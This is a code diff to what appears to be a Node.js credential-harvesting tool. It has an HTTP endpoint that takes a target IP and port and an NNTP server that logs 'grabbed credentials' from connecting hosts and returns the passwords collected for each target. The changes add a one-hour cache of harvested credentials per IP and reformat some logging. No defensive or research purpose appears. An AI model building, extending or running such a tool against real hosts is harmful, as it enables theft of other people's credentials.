@@ -7,7 +7,7 @@ import fastify from "fastify";
 import chalk from "chalk";
 
 const httpServer = fastify({
-	// logger: true
+	// logger: true,
 });
 const nntpServer = net.createServer();
 const testServerBodyBase = {
@@ -39,6 +39,7 @@ const testServerHeaders = {
 	Referer: "",
 };
 let credentials = {};
+let cache = [];
 
 // #region HTTP
 const bRequest = async (url, opts = {}) => {
@@ -69,6 +70,21 @@ Disallow: /`);
 
 httpServer.get("/:target", async (request) => {
 	const { target } = request.params;
+	if (
+		cache.find((cached) => cached.ip === target.split(":")[0]) &&
+		cache.find((cached) => cached.ip === target.split(":")[0]).time <
+			Date.now() - 60 * 60 * 1000
+	) {
+		cache.splice(
+			cache.findIndex((cached) => cached.ip === target.split(":")[0]),
+			1,
+		);
+	} else if (cache.find((cached) => cached.ip === target.split(":")[0])) {
+		return {
+			error: false,
+			data: credentials[target.split(":")[0]].filter((cred) => cred.password),
+		};
+	}
 	credentials[target.split(":")[0]] = [];
 	if (!target.match(/[0-9]+(?:\.[0-9]+){3}:[0-9]+/)?.length) {
 		console.log(
@@ -207,6 +223,8 @@ httpServer.get("/:target", async (request) => {
 		};
 	}
 
+	cache.push({ ip: target.split(":")[0], time: Date.now() });
+
 	return {
 		error: false,
 		data: credentials[target.split(":")[0]].filter((cred) => cred.password),
@@ -262,9 +280,10 @@ nntpServer.on("connection", (socket) => {
 			socket.destroy();
 			console.log(
 				chalk.blue.bold(
-					`  │     [nntp] (${socket.remoteAddress}) grabbed credentials for (${credentials[credentialKey][
-						credentials[credentialKey].length - 1
-					].server}):`,
+					`  │     [nntp] (${socket.remoteAddress}) grabbed credentials for (${
+						credentials[credentialKey][credentials[credentialKey].length - 1]
+							.server
+					}):`,
 				),
 			);
 			console.log(
